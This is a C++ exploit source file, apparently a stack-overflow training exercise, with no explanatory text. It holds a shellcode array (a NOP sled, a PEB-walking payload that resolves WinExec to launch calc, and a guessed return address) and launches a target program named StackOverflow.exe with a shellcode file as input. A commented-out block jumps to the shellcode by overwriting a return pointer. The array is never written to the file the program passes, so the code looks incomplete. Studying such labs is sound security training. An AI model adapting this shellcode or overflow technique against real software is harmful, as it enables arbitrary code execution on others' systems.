// Exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <fstream>
#include <windows.h>

#include <stdio.h>
static unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59"
"\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B"
"\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F"
"\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01"
"\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42"
"\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75"
"\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE"
"\xFF\xD7\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\xFF\xD0\x90\x90\x90\x90\x90\x90\x90"
"\x9A\xFE\x19\x00";

//int main()
//{
//	int *ret;
//	ret = (int *)&ret + 2;
//	printf("Shellcode Length is : %d\n", strlen(shellcode));
//	(*ret) = (int)shellcode;
//	return 0;
//}
int main()
{
	char buffer[1024]{};
	::sprintf(buffer, "StackOverflow.exe shellcode.bin");

	STARTUPINFO si{};
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi{};

	DWORD error{};
	if (!::CreateProcess(nullptr, buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
		DWORD error = GetLastError();
		std::cout << "Failed to create process, error " << error << std::endl;
		return -1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return error;
}
